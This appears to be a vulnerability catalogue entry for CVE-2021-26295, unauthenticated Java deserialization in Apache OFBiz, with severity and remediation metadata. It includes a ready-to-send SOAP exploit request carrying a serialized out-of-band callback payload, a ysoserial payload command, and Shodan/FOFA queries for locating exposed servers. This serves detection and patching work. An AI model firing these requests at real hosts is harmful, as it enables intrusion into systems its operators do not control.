_cves/2021/cve-2021-26295.md

---
layout: post
cve_id: CVE-2021-26295
title: Apache OFBiz <17.12.06 - Arbitrary Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-26295.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-26295.yaml
snort2_rule: N/A
snort3_rule: N/A
author: madrobot
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected system.

  '
remediation: 'Upgrade Apache OFBiz to version 17.12.06 or later to mitigate this vulnerability.

  '
reference:
- https://github.com/yumusb/CVE-2021-26295-POC
- https://packetstormsecurity.com/files/162104/Apache-OFBiz-SOAP-Java-Deserialization.html
- https://github.com/zhzyker/exphub/tree/master/ofbiz
- https://lists.apache.org/thread.html/r3c1802eaf34aa78a61b4e8e044c214bc94accbd28a11f3a276586a31%40%3Cuser.ofbiz.apache.org%3E
- https://lists.apache.org/thread.html/r6e4579c4ebf7efeb462962e359501c6ca4045687f12212551df2d607@%3Cnotifications.ofbiz.apache.org%3E
- https://nvd.nist.gov/vuln/detail/CVE-2021-26295
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-26295
  cwe-id: CWE-502
  epss-score: 0.94237
  epss-percentile: 0.99922
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: apache
  product: ofbiz
  shodan-query:
  - OFBiz.Visitor=
  - http.html:"ofbiz"
  - ofbiz.visitor=
  fofa-query:
  - body="ofbiz"
  - app="apache_ofbiz"
  ysoserial-payload: java -jar ysoserial.jar URLDNS https://oob-url-to-request.tld
    | hex
tags:
- cve2021
- cve
- packetstorm
- apache
- ofbiz
- deserialization
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.


## ðŸŒ HTTP Request
```nohighlight
POST /webtools/control/SOAPService HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 1029
Content-Type: application/xml
Accept-Encoding: gzip

<?xml version='1.0' encoding='UTF-8'?>
<soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
    <soapenv:Body>
      <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
          <ns1:cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74002a643569753239316c65306f333274336663307067656f68616a73617735713138612e6f6173742e70726f74000071007e00057400046874747073707874003268747470733a2f2f643569753239316c65306f333274336663307067656f68616a73617735713138612e6f6173742e70726f78</ns1:cus-obj>
      </ns1:clearAllEntityCaches>
    </soapenv:Body>
</soapenv:Envelope>
```

